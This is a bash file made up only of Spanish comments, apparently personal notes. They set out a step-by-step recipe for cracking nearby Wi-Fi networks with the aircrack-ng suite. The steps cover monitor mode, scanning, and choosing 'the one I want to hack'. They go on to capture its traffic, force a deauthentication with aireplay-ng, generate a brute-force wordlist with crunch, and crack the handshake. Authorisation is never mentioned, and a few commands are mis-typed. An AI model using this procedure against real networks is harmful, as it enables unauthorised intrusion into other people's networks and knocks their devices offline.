#!/bin/bash


# cuando uso IWCONFIG lo que estoy buscando es recuperar el nombre del 
# adaptador de red para luego poder hacer un AIRODUMP-NG. El nombre figura
# en la primer columna del cuadro.



# Cuando corro el comando AIRMON-NG CHECK KILL mato los procesos y pongo 
# el adaptador de red en modo monitor.


# Una vez que tengo el "nombre del adapatador de red" corro el siguente
# comando: AIRODUMP-NG [nombre del adaptador]. Esto me monitorea todas las 
# redes cercanas y me devuelve por ej. El nombre de la red, el tipo, 
# la potencia, el canal etc. 


# Ahora tomo el BSSID que mayor potencia tiene o el que quiero hackear 
# y corro el siguente comando: AIRODUMP-NG --BSSID [Numero BSSID de la red
# elegida] --CHANNEL [el numero del canal] --WRITE [nombre del archivo de 
# destino] [nombre del adaptador de red]
 

# AIREPLAY-NG --DEAUTH7 -a [bssid] -c [Station] [nombre del adaptador]

# CRUNCH [min] [max] [caracters posibles] -o [nombre del archivo .txt]
# -t [patron posible]

# AIRCRACK-NG [archivo .cap] -w [archivo .txt]
#